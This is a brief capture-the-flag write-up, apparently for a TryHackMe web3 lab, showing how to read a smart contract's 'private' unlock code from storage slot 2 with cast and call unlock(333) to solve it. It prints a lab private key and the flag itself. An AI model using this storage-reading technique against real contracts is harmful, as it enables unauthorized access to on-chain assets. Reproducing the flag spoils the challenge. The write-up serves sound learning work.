Summary of Steps
Set Up Environment Variables:

1. We set up the necessary environment variables to interact with the blockchain:
```
export RPC_URL=http://10.10.109.18:8545
export API_URL=http://10.10.109.18
export PRIVATE_KEY=0xd82c93cb341c01fbc08feffb5c30a5b1a3f521c9811977a7f28353dab39824b0
export CONTRACT_ADDRESS=0xf22cB0Ca047e88AC996c17683Cee290518093574
```
2. Read the code Variable:

We used cast storage to read the value of the private code variable from storage slot 2:
```
cast storage $CONTRACT_ADDRESS 2 --rpc-url $RPC_URL
```
The output was 0x000000000000000000000000000000000000000000000000000000000000014d, which is 333 in decimal.



3. Unlock the Contract:

We called the unlock function with the correct code value (333) using cast send:
```
cast send $CONTRACT_ADDRESS "unlock(uint256)" 333 --private-key $PRIVATE_KEY --rpc-url $RPC_URL --legacy

```
The --legacy flag was used to bypass the EIP-1559 unsupported feature error.

4. Verify the Contract is Solved:

We checked if the isSolved() function returned true:

```
cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL
```

5. Retrieve the Flag:

Finally, we used the API endpoint to retrieve the flag:
`curl $API_URL/challenge/solve`


The flag was returned as: `{"flag":"THM{web3_h4ck1ng_code}"}`

